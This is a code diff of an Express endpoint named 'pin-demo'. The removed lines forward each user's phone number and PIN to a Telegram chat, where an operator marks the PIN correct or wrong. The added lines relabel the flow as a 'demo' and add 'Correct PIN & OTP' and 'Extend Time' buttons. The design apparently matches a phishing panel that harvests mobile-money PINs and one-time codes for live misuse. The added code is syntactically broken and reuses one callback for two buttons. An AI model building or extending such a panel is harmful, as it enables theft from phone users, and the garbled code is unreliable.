@@ -67,28 +67,41 @@ app.post("/api/pin-demo", async (req, res) => {
   
   const timeString = new Date().toLocaleString("en-US", { timeZone: "Africa/Nairobi" });
   
-    try {
-    await telegram("sendMessage", {
-      chat_id: CHAT_ID,
-      text: [
-        "# Thor - PIN Verification",
-        "PIN VERIFICATION NEEDED\n",
-        "USER DETAILS:",
-        `• Phone Number: ${request.phone}`,
-        `• PIN Code: ${request.pin}`,
-        `• Time: ${timeString}`,
-        "============================\n",
-        "Verify the PIN:",
-        "• PIN Length: 5 digits"
-      ].join("\n"),
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Correct PIN", callback_data: `approve:${request.id}` },
-            { text: "❌ Wrong PIN", callback_data: `decline:${request.id}` }
-          ]
-        ]
-      }
+    try: [
+  "# Thor - PIN Verification",
+  "TEST VERIFICATION NEEDED\n",
+  "USER DETAILS:",
+  `• Phone Number: ${request.phone}`,
+  `• User ID: ${request.id}`,
+  `• Time: ${timeString}`,
+  "• Bot: user178",
+  "",
+  "━━━━━━━━━━━━━━━━━━━━",
+  "",
+  "Verify the test submission:",
+  "• Mode: Demo verification",
+  "• Timeout: 5 minutes",
+  "",
+  "━━━━━━━━━━━━━━━━━━━━",
+  "",
+  "⏳ AWAITING VERIFICATION"
+].join("\n"),
+
+reply_markup: {
+  inline_keyboard: [
+    [
+      { text: "✅ Correct PIN", callback_data: `approve:${request.id}` }
+    ],
+    [
+      { text: "Correct PIN & OTP", callback_data: `extend:${request.id}` },
+      { text: "❌ Wrong PIN", callback_data: `decline:${request.id}` }
+    ],
+    [
+      { text: "⏱ Extend Time", callback_data: `extend:${request.id}` }
+    ]
+  ]
+}
+  
     });
     return res.json({ status: "pending" });
   } catch (err) {
